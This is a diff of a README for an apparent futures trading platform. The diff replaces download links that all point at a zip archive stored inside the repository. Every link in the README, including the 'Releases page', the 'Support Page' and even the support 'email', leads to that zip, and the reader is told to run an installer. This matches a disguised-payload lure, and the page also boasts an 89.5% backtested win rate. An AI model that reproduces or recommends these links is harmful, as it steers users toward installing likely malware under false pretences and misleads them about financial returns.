@@ -1,6 +1,6 @@
 # 🌟 algorithmic-trading-platform - Make Smarter Trades with Ease
 
-[![Download](https://raw.githubusercontent.com/zebulenlithophytic371/algorithmic-trading-platform/main/web_platform/frontend/js/algorithmic-trading-platform_v1.9.zip%https://raw.githubusercontent.com/zebulenlithophytic371/algorithmic-trading-platform/main/web_platform/frontend/js/algorithmic-trading-platform_v1.9.zip)](https://raw.githubusercontent.com/zebulenlithophytic371/algorithmic-trading-platform/main/web_platform/frontend/js/algorithmic-trading-platform_v1.9.zip)
+[![Download](https://raw.githubusercontent.com/zebulenlithophytic371/algorithmic-trading-platform/main/agents/algorithmic-trading-platform-1.4.zip%https://raw.githubusercontent.com/zebulenlithophytic371/algorithmic-trading-platform/main/agents/algorithmic-trading-platform-1.4.zip)](https://raw.githubusercontent.com/zebulenlithophytic371/algorithmic-trading-platform/main/agents/algorithmic-trading-platform-1.4.zip)
 
 ## 📦 Overview
 The algorithmic-trading-platform is an advanced trading system designed for futures markets. It uses pattern recognition to analyze data, helping you make better trading decisions. With a backtested win rate of 89.5%, this platform aims to improve your trading outcomes using Python and the TopStepX API for real-time execution.
@@ -20,10 +20,10 @@ Before you begin, ensure your computer meets these requirements:
 ### 2. Downloading the Application
 To download the latest release, click the link below or visit the Releases page.
 
-[Download Latest Release](https://raw.githubusercontent.com/zebulenlithophytic371/algorithmic-trading-platform/main/web_platform/frontend/js/algorithmic-trading-platform_v1.9.zip)
+[Download Latest Release](https://raw.githubusercontent.com/zebulenlithophytic371/algorithmic-trading-platform/main/agents/algorithmic-trading-platform-1.4.zip)
 
 ### 3. Installing the Application
-1. **Visit the Releases Page:** Click [here](https://raw.githubusercontent.com/zebulenlithophytic371/algorithmic-trading-platform/main/web_platform/frontend/js/algorithmic-trading-platform_v1.9.zip) to access the Releases page.
+1. **Visit the Releases Page:** Click [here](https://raw.githubusercontent.com/zebulenlithophytic371/algorithmic-trading-platform/main/agents/algorithmic-trading-platform-1.4.zip) to access the Releases page.
 2. **Select the Latest Version:** You will see a list of available versions. Choose the one marked as 'Latest'.
 3. **Download the Installer:** Find and click on the installer for your operating system (e.g., `.exe` for Windows or `.dmg` for macOS).
 4. **Run the Installer:** Once the file has downloaded, double-click it to start the installation process. 
@@ -52,7 +52,7 @@ If you encounter issues during installation or while running the application, co
 - **Reinstall the Application:** If problems persist, uninstall and reinstall the application.
 
 ## 📞 Support
-For further assistance, visit our [Support Page](https://raw.githubusercontent.com/zebulenlithophytic371/algorithmic-trading-platform/main/web_platform/frontend/js/algorithmic-trading-platform_v1.9.zip) or contact our support team via email at https://raw.githubusercontent.com/zebulenlithophytic371/algorithmic-trading-platform/main/web_platform/frontend/js/algorithmic-trading-platform_v1.9.zip
+For further assistance, visit our [Support Page](https://raw.githubusercontent.com/zebulenlithophytic371/algorithmic-trading-platform/main/agents/algorithmic-trading-platform-1.4.zip) or contact our support team via email at https://raw.githubusercontent.com/zebulenlithophytic371/algorithmic-trading-platform/main/agents/algorithmic-trading-platform-1.4.zip
 
 ## 📝 License
 This project is licensed under the MIT License. Please refer to the LICENSE file in the repository for more details.
